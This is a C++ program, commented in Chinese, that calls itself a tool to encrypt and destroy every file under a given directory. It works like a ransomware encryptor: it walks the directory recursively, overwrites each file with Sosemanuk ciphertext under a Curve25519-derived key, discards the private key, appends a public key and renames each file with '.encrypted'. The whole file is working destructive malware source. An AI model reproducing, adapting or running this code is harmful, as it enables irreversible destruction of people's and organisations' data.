//在general.cpp的基础上修改为加密销毁指定路径下的所有文件

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <dirent.h>
#include <chrono> // 添加计时功能
#include "curve25519-donna.h"
#include "sosemanuk.h"
#include "sha256.h"

// 声明全局变量
static uint8_t basepoint[32] = { 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
static uint8_t m_priv[32]; // 用于存储私钥
static uint8_t m_publ[32]; // 用于存储公钥
uint64_t gb_encrypted = 0;  // 用于统计加密的字节数
int files_encrypted = 0;     // 用于统计加密的文件数量

#define CONST_1MB 1048576ll
#define CONST_BLOCK (CONST_1MB * 10) // 定义 CONST_BLOCK 为 10MB

void csprng(uint8_t* buffer, int count) {
    if (FILE *fp = fopen("/dev/urandom", "r")) {
        fread(buffer, 1, count, fp);
        fclose(fp);
    }
}

void encrypt_file(const char* path) {
    uint32_t wholeReaded = 0;
    size_t readed = 0;

    uint8_t u_publ[32];
    uint8_t u_priv[32];
    uint8_t u_secr[32];
    uint8_t sm_key[32];
    struct stat64 fstat;

    sha256_context sc;
    sosemanuk_key_context kc;
    sosemanuk_run_context rc;

    // 生成 m_priv 和 m_publ
    csprng(m_priv, 32); // 生成 m_priv
    m_priv[0] &= 248;
    m_priv[31] &= 127;
    m_priv[31] |= 64;
    curve25519_donna(m_publ, m_priv, basepoint); // 生成 m_publ

    if(stat64(path, &fstat) == 0) {
        if (FILE *fp = fopen(path, "r+b")) {
            if(uint8_t* f_data = (uint8_t*)malloc(CONST_BLOCK)) {
                csprng(u_priv, 32);
                u_priv[0] &= 248;
                u_priv[31] &= 127;
                u_priv[31] |= 64;
                curve25519_donna(u_publ, u_priv, basepoint);
                curve25519_donna(u_secr, u_priv, m_publ);
                memset(u_priv, 0, 32);

                sha256_init(&sc);
                sha256_hash(&sc, u_secr, 32);
                sha256_done(&sc, sm_key);
                memset((uint8_t*)&sc, 0, sizeof(sha256_context));

                sosemanuk_schedule(&kc, sm_key, 32);
                sosemanuk_init(&rc, &kc, 0, 0);

                memset(sm_key, 0, 32);
                do {
                    wholeReaded += readed = fread(f_data, 1, CONST_BLOCK, fp);
                    if(readed) {
                        sosemanuk_encrypt(&rc, f_data, f_data, readed);
                        fseek(fp, -readed, SEEK_CUR);
                        fwrite(f_data, 1, readed, fp);
                    } else break;
                } while(wholeReaded < 0x20000000 && wholeReaded < fstat.st_size);

                memset((uint8_t*)&kc, 0, sizeof(sosemanuk_key_context));
                memset((uint8_t*)&rc, 0, sizeof(sosemanuk_run_context));
                __sync_add_and_fetch(&gb_encrypted, fstat.st_size);

                fseek(fp, 0, SEEK_END);
                fwrite(u_publ, 1, 32, fp);

                files_encrypted++;

                free(f_data);
            }
            fflush(fp);
            fclose(fp);

            // 确保文件重命名为 .encrypted 后缀
            char locked_name[4097];
            strcpy(locked_name, path);
            strcat(locked_name, ".encrypted"); // 修改为 .encrypted 后缀
            rename(path, locked_name);
        }
    }
}

void find_files_recursive(const char* dir_path) {
    DIR* dir = opendir(dir_path);
    if (dir == NULL) {
        perror("Error opening directory");
        return;
    }

    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        // 跳过当前目录和父目录
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        // 构建完整路径
        char full_path[4096];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        // 如果是目录，递归查找
        if (entry->d_type == DT_DIR) {
            find_files_recursive(full_path);
        } 
        // 如果是文件，进行加密
        else if (entry->d_type == DT_REG) {
            // 检查文件是否已经加密
            if (strstr(entry->d_name, ".encrypted") != NULL) {
                continue; // 跳过已经加密的文件
            }
            printf("Encrypting: %s\n", full_path);
            encrypt_file(full_path);
        }
    }

    closedir(dir);
}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        auto start_time = std::chrono::high_resolution_clock::now(); // 开始计时
        find_files_recursive(argv[1]); // 查找并加密指定目录下的所有文件
        auto end_time = std::chrono::high_resolution_clock::now(); // 结束计时

        // 计算并输出总用时
        std::chrono::duration<double> total_elapsed = end_time - start_time;
        printf("Total encryption time: %.6f seconds\n", total_elapsed.count());
    } else {
        printf("Usage: %s /path/to/directory\n", argv[0]);
    }
    return 0;
}